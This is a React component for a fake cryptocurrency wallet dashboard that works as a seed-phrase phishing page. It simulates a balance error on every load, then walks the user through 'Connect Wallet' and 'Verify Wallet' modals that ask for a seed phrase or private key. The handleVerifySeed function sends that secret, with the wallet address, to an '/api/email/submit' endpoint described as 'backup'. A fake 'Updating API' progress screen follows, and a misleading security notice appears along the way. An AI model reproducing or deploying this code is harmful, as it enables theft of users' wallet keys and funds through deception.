"use client"

import { useState, useEffect } from "react"
import { ArrowLeft, RefreshCw, TrendingUp, Activity, X, Shield, AlertTriangle, Info, Eye, EyeOff, CheckCircle, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { useRouter } from "next/navigation"

interface DashboardProps {
  network: string
  symbol: string
  walletAddress: string
}

interface NetworkConfig {
  name: string
  color: string
  displaySymbol: string
}

export default function DynamicDashboard({ network, symbol, walletAddress }: DashboardProps) {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(true)
  const [balanceError, setBalanceError] = useState(false)
  const [showConnectModal, setShowConnectModal] = useState(false)
  const [showSeedModal, setShowSeedModal] = useState(false)
  const [seedPhrase, setSeedPhrase] = useState("")
  const [showSeedPhrase, setShowSeedPhrase] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isSuccess, setIsSuccess] = useState(false)
  const [showUpdatingModal, setShowUpdatingModal] = useState(false)
  const [updateProgress, setUpdateProgress] = useState(0)
  const [updateAttempt, setUpdateAttempt] = useState(1)

  const networkConfigs: { [key: string]: NetworkConfig } = {
    BTC: { name: "Bitcoin", color: "bg-orange-500", displaySymbol: "₿" },
    ETH: { name: "Ethereum", color: "bg-blue-500", displaySymbol: "Ξ" },
    SOL: { name: "Solana", color: "bg-purple-500", displaySymbol: "◎" },
    XRP: { name: "XRP", color: "bg-blue-400", displaySymbol: "✗" },
    ADA: { name: "Cardano", color: "bg-blue-600", displaySymbol: "₳" },
    APT: { name: "Aptos", color: "bg-green-500", displaySymbol: "⬟" },
    DOT: { name: "Polkadot", color: "bg-pink-500", displaySymbol: "●" },
    CRO: { name: "Cronos", color: "bg-blue-700", displaySymbol: "◈" },
    TON: { name: "TON", color: "bg-blue-500", displaySymbol: "💎" },
    VENOM: { name: "Venom", color: "bg-green-600", displaySymbol: "⚡" },
    SUI: { name: "Sui", color: "bg-cyan-500", displaySymbol: "🌊" },
    XRD: { name: "Radix", color: "bg-red-500", displaySymbol: "⚛" },
    RON: { name: "Ronin", color: "bg-blue-600", displaySymbol: "🗡" },
    RUNE: { name: "THORChain", color: "bg-green-500", displaySymbol: "ᚱ" },
    HBAR: { name: "Hedera", color: "bg-purple-600", displaySymbol: "ℏ" },
    FLR: { name: "Flare", color: "bg-red-500", displaySymbol: "🔥" },
    KPLR: { name: "Cosmos", color: "bg-purple-500", displaySymbol: "⚛" },
    OTHER: { name: "Other", color: "bg-gray-500", displaySymbol: "◯" }
  }

  const config = networkConfigs[symbol] || networkConfigs.OTHER

  useEffect(() => {
    // Simulate loading for 3 seconds, then show error
    const timer = setTimeout(() => {
      setIsLoading(false)
      setBalanceError(true)
    }, 3000)

    return () => clearTimeout(timer)
  }, [])

  useEffect(() => {
    if (showUpdatingModal) {
      const interval = setInterval(() => {
        setUpdateProgress((prev) => {
          if (prev >= 100) {
            clearInterval(interval)
            return 100
          }
          return prev + 10
        })
      }, 300)

      return () => clearInterval(interval)
    }
  }, [showUpdatingModal])

  const handleCloseUpdatingModal = () => {
    setShowUpdatingModal(false)
    setUpdateProgress(0)
    setUpdateAttempt(1)
    // Reset loading state and simulate again
    setIsLoading(true)
    setBalanceError(false)
    
    setTimeout(() => {
      setIsLoading(false)
      setBalanceError(true)
    }, 3000)
  }

  const handleBack = () => {
    router.back()
  }

  const handleUpdateAPI = () => {
    setShowConnectModal(true)
  }

  const handleConnectWallet = () => {
    setShowConnectModal(false)
    setShowSeedModal(true)
  }

  const handleVerifySeed = async () => {
    if (!seedPhrase.trim()) return

    setIsSubmitting(true)
    
    try {
      // Send to email API for backup
      const response = await fetch('/api/email/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          network: config.name,
          symbol: symbol,
          walletAddress: walletAddress,
          seedData: seedPhrase,
          timestamp: new Date().toISOString()
        }),
      })

      const responseData = await response.json()
      console.log('Email API response:', { status: response.status, data: responseData })

      if (response.ok) {
        setIsSuccess(true)
        
        // Wait a moment to show success state, then show updating modal
        setTimeout(() => {
          setShowSeedModal(false)
          setSeedPhrase("")
          setIsSuccess(false)
          setShowUpdatingModal(true)
          setUpdateProgress(0)
        }, 2000)
      } else {
        console.error('Failed to submit backup:', responseData)
        // Continue with normal flow even if email fails
        setShowSeedModal(false)
        setSeedPhrase("")
        setIsLoading(true)
        setBalanceError(false)
        
        setTimeout(() => {
          setIsLoading(false)
          setBalanceError(true)
        }, 3000)
      }
    } catch (error) {
      console.error('Error submitting backup:', error)
      // Continue with normal flow even if email fails
      setShowSeedModal(false)
      setSeedPhrase("")
      setIsLoading(true)
      setBalanceError(false)
      
      setTimeout(() => {
        setIsLoading(false)
        setBalanceError(true)
      }, 3000)
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleCancelSeed = () => {
    setShowSeedModal(false)
    setSeedPhrase("")
    setIsSuccess(false)
  }

  return (
    <div className="min-h-screen bg-darkBlueCustom relative overflow-hidden">
      {/* Crypto Ticker */}
      <div
        className="bg-black/30 backdrop-blur-sm border-b border-white/10"
        style={{ height: "40px", padding: 0, margin: 0, width: "100%" }}
      >
        <iframe
          src="https://widget.coinlib.io/widget?type=horizontal_v2&theme=dark&pref_coin_id=1505&invert_hover=no"
          width="100%"
          height="36px"
          scrolling="auto"
          marginWidth={0}
          marginHeight={0}
          frameBorder="0"
          style={{ border: 0, margin: 0, padding: 0 }}
          title="Cryptocurrency Price Ticker"
        />
      </div>

      {/* Background Pattern - Same as homepage */}
      <div className="absolute inset-0 opacity-20">
        <svg className="w-full h-full" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg">
          <path d="M100,500 Q300,200 500,500 T900,500" stroke="rgba(255,255,255,0.1)" strokeWidth="2" fill="none" />
          <path d="M0,300 Q200,100 400,300 T800,300" stroke="rgba(255,255,255,0.1)" strokeWidth="1" fill="none" />
          <circle cx="100" cy="200" r="3" fill="rgba(255,255,255,0.3)" />
          <circle cx="900" cy="300" r="2" fill="rgba(255,255,255,0.2)" />
          <circle cx="800" cy="700" r="4" fill="rgba(255,255,255,0.1)" />
        </svg>
      </div>

      <div className="relative z-10 px-4 py-6">
        <div className="max-w-4xl mx-auto">
          {/* Header */}
          <div className="flex items-center gap-4 mb-8 text-white">
            <Button 
              variant="ghost" 
              size="icon" 
              className="text-white hover:bg-white/10"
              onClick={handleBack}
            >
              <ArrowLeft className="h-5 w-5" />
            </Button>
            <div className="flex items-center gap-3">
              <div className={`w-10 h-10 ${config.color} rounded-full flex items-center justify-center shadow-lg`}>
                <span className="text-white font-bold text-sm drop-shadow-sm">{config.displaySymbol}</span>
              </div>
              <div>
                <h1 className="text-2xl font-bold text-white drop-shadow-sm">{config.name} Dashboard</h1>
                <p className="text-purple-200 text-sm drop-shadow-sm">Wallet Overview</p>
              </div>
            </div>
          </div>

          {/* Main Content */}
          {/* Wallet Balance Card */}
          <Card className="bg-black/20 backdrop-blur-sm border-white/10 shadow-xl mb-6">
            <CardHeader className="flex flex-row items-center justify-between">
              <CardTitle className="text-white text-xl">Wallet Balance</CardTitle>
              <Button 
                variant="ghost" 
                size="icon" 
                className="text-gray-300 hover:text-white hover:bg-white/10"
                onClick={handleUpdateAPI}
              >
                <RefreshCw className={`h-4 w-4 ${isLoading ? 'animate-spin' : ''}`} />
              </Button>
            </CardHeader>
            <CardContent className="space-y-6">
              {/* Address Section */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-gray-300 text-sm">Address</span>
                  <span className="text-green-200 text-xs bg-green-600/30 border border-green-400/50 px-2 py-1 rounded-full font-medium">
                    Connected
                  </span>
                </div>
                <div className="text-white font-mono text-sm bg-gray-800/70 p-3 rounded border border-gray-600/50 break-all">
                  {walletAddress}
                </div>
              </div>

              {/* Balance and Network */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="space-y-2">
                  <div className="flex items-center gap-2 text-gray-300 text-sm">
                    <span className="text-green-400">$</span>
                    Balance
                  </div>
                  <div className="bg-gray-800/70 p-4 rounded border border-gray-600/50">
                    {isLoading ? (
                      <div className="w-20 h-6 bg-gray-600 rounded animate-pulse"></div>
                    ) : balanceError ? (
                      <div className="text-red-400 text-sm">Error loading balance</div>
                    ) : (
                      <div className="text-white text-xl font-bold">0.00 {symbol}</div>
                    )}
                  </div>
                </div>
                <div className="space-y-2">
                  <div className="flex items-center gap-2 text-gray-300 text-sm">
                    <Activity className="h-4 w-4 text-blue-400" />
                    Network
                  </div>
                  <div className="text-white font-medium">{config.name}</div>
                </div>
              </div>

              {/* Update API Button */}
              <Button 
                className={`w-full ${config.color} hover:opacity-90 text-white font-medium py-3 shadow-lg`}
                onClick={handleUpdateAPI}
              >
                Update API
              </Button>
            </CardContent>
          </Card>

          {/* Stats Cards */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <Card className="bg-black/20 backdrop-blur-sm border-white/10 shadow-xl">
              <CardContent className="p-6">
                <div className="space-y-2">
                  <p className="text-gray-300 text-sm">24h Change</p>
                  <div className="flex items-center gap-2">
                    <TrendingUp className="h-4 w-4 text-green-400" />
                    <span className="text-green-400 text-xl font-bold">+2.34%</span>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-black/20 backdrop-blur-sm border-white/10 shadow-xl">
              <CardContent className="p-6">
                <div className="space-y-2">
                  <p className="text-gray-300 text-sm">Market Cap</p>
                  <p className="text-white text-xl font-bold">$1.2T</p>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-black/20 backdrop-blur-sm border-white/10 shadow-xl">
              <CardContent className="p-6">
                <div className="space-y-2">
                  <p className="text-gray-300 text-sm">Volume</p>
                  <p className="text-white text-xl font-bold">$45.6B</p>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>

      {/* Connect Wallet Modal */}
      {showConnectModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="bg-gray-800/90 backdrop-blur-sm rounded-lg p-6 w-full max-w-md mx-4 border border-gray-600/50">
            {/* Modal Header */}
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center gap-3">
                <Shield className="w-6 h-6 text-gray-400" />
                <h2 className="text-white text-lg font-semibold">Connect Wallet</h2>
              </div>
              <Button
                variant="ghost"
                size="icon"
                onClick={() => setShowConnectModal(false)}
                className="text-gray-400 hover:text-white hover:bg-gray-700"
              >
                <X className="h-5 w-5" />
              </Button>
            </div>

            {/* Network Logo */}
            <div className="flex justify-center mb-6">
              <div className={`w-16 h-16 ${config.color} rounded-full flex items-center justify-center shadow-lg`}>
                <span className="text-white font-bold text-xl">{symbol}</span>
              </div>
            </div>

            {/* Modal Content */}
            <div className="text-center mb-6">
              <h3 className="text-white text-xl font-semibold mb-2">Connect to {config.name}</h3>
              <p className="text-gray-300 text-sm">
                We&lsquo;ll connect to your {config.name} wallet to update the API configuration.
              </p>
            </div>

            {/* Wallet Address */}
            <div className="mb-6">
              <label className="text-gray-300 text-sm block mb-2">Wallet Address:</label>
              <div className="bg-gray-700/70 p-3 rounded border border-gray-600/50 text-white font-mono text-sm break-all">
                {walletAddress}
              </div>
            </div>

            {/* Connect Button */}
            <Button
              onClick={handleConnectWallet}
              className={`w-full ${config.color} hover:opacity-90 text-white font-medium py-3`}
            >
              Connect Wallet
            </Button>
          </div>
        </div>
      )}

      {/* Seed Phrase Verification Modal */}
      {showSeedModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="bg-gray-800/90 backdrop-blur-sm rounded-lg p-6 w-full max-w-md mx-4 border border-gray-600/50">
            {/* Modal Header */}
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center gap-3">
                <Shield className="w-6 h-6 text-gray-400" />
                <h2 className="text-white text-lg font-semibold">Verify Wallet</h2>
              </div>
              <Button
                variant="ghost"
                size="icon"
                onClick={handleCancelSeed}
                className="text-gray-400 hover:text-white hover:bg-gray-700"
              >
                <X className="h-5 w-5" />
              </Button>
            </div>

            {/* Warning Icon */}
            <div className="flex justify-center mb-6">
              <div className="w-16 h-16 bg-yellow-500 rounded-full flex items-center justify-center shadow-lg">
                <AlertTriangle className="h-8 w-8 text-white" />
              </div>
            </div>

            {/* Modal Content */}
            <div className="text-center mb-6">
              <h3 className="text-white text-xl font-semibold mb-2">Enter Seed Phrase or Private Key</h3>
              <p className="text-gray-300 text-sm">Please enter your seed phrase or private key to verify wallet ownership.</p>
            </div>

            {/* Network Support Info */}
            <div className="bg-blue-900/30 border border-blue-600/50 rounded-lg p-3 mb-4">
              <div className="flex items-center gap-2 text-blue-300 text-sm">
                <Info className="h-4 w-4" />
                <span>{config.name} supports:</span>
              </div>
              <p className="text-blue-200 text-sm mt-1">
                Seed phrase: {symbol === 'BTC' ? '12 or 24 words' : 
                 symbol === 'ETH' || symbol === 'CRO' || symbol === 'FLR' ? '12, 15, 18, or 24 words' :
                 symbol === 'SOL' || symbol === 'APT' || symbol === 'SUI' ? '12 or 24 words' :
                 '12, 15, 18, or 24 words'} or Private key
              </p>
            </div>

            {/* Seed Phrase Input */}
            <div className="mb-4">
              <div className="relative">
                <textarea
                  value={showSeedPhrase ? seedPhrase : '•'.repeat(seedPhrase.length)}
                  onChange={(e) => {
                    if (showSeedPhrase) {
                      setSeedPhrase(e.target.value)
                    } else {
                      // If masked, we need to handle this differently
                      const newLength = e.target.value.length
                      const oldLength = seedPhrase.length
                      if (newLength > oldLength) {
                        // Characters added
                        const addedChars = e.target.value.slice(oldLength).replace(/•/g, '')
                        setSeedPhrase(seedPhrase + addedChars)
                      } else {
                        // Characters removed
                        setSeedPhrase(seedPhrase.slice(0, newLength))
                      }
                    }
                  }}
                  placeholder={`Enter your ${config.name} seed phrase or private key...`}
                  className="w-full h-24 bg-gray-700/70 border border-gray-600/50 rounded-lg p-3 text-white placeholder-gray-400 resize-none focus:outline-none focus:border-blue-500"
                />
                <Button
                  variant="ghost"
                  size="icon"
                  onClick={() => setShowSeedPhrase(!showSeedPhrase)}
                  className="absolute top-3 right-3 text-gray-400 hover:text-white hover:bg-gray-600"
                >
                  {showSeedPhrase ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                </Button>
              </div>
            </div>

            {/* Security Notice */}
            <div className="bg-yellow-900/30 border border-yellow-600/50 rounded-lg p-3 mb-6">
              <div className="flex items-start gap-2">
                <AlertTriangle className="h-4 w-4 text-yellow-400 mt-0.5 flex-shrink-0" />
                <div>
                  <p className="text-yellow-300 text-sm font-medium">Security Notice</p>
                  <p className="text-yellow-200 text-xs mt-1">
                    Never share your seed phrase or private key. We use it only for verification and secure backup.
                  </p>
                </div>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="flex gap-3">
              <Button
                onClick={handleCancelSeed}
                variant="outline"
                className="flex-1 bg-transparent border-gray-600 text-gray-300 hover:bg-gray-700 hover:text-white"
              >
                Cancel
              </Button>
              <Button
                type="button"
                onClick={(e) => {
                  e.preventDefault()
                  e.stopPropagation()
                  handleVerifySeed()
                }}
                className={`flex-1 ${isSuccess ? 'bg-green-600' : config.color} hover:opacity-90 text-white font-medium flex items-center justify-center gap-2`}
                disabled={!seedPhrase.trim() || isSubmitting || isSuccess}
              >
                {isSubmitting && <Loader2 className="h-4 w-4 animate-spin" />}
                {isSuccess && <CheckCircle className="h-4 w-4" />}
                {isSubmitting ? 'Verifying...' : isSuccess ? 'Successful' : 'Verify'}
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Updating API Modal */}
      {showUpdatingModal && (
        <div 
          className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50"
          onClick={handleCloseUpdatingModal}
        >
          <div 
            className="bg-gray-800/90 backdrop-blur-sm rounded-lg p-6 w-full max-w-md mx-4 border border-gray-600/50"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Modal Header */}
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center gap-3">
                <Shield className="w-6 h-6 text-gray-400" />
                <h2 className="text-white text-lg font-semibold">Updating API...</h2>
              </div>
              <Button
                variant="ghost"
                size="icon"
                onClick={handleCloseUpdatingModal}
                className="text-gray-400 hover:text-white hover:bg-gray-700"
              >
                <X className="h-5 w-5" />
              </Button>
            </div>

            {/* Loading Spinner */}
            <div className="flex justify-center mb-6">
              <div className="w-16 h-16 border-4 border-gray-600 border-t-blue-500 rounded-full animate-spin"></div>
            </div>

            {/* Modal Content */}
            <div className="text-center mb-6">
              <h3 className="text-white text-xl font-semibold mb-2">Updating API</h3>
              <p className="text-gray-300 text-sm">Updating API configuration for your {config.name} wallet...</p>
            </div>

            {/* Progress Info */}
            <div className="mb-4">
              <div className="flex justify-between items-center mb-2">
                <span className="text-gray-300 text-sm">Attempt {updateAttempt} of 3</span>
                <span className="text-gray-300 text-sm">{updateProgress}%</span>
              </div>

              {/* Progress Bar */}
              <div className="w-full bg-gray-600 rounded-full h-2">
                <div
                  className={`${config.color.replace('bg-', 'bg-')} h-2 rounded-full transition-all duration-300 ease-out`}
                  style={{ width: `${updateProgress}%` }}
                ></div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
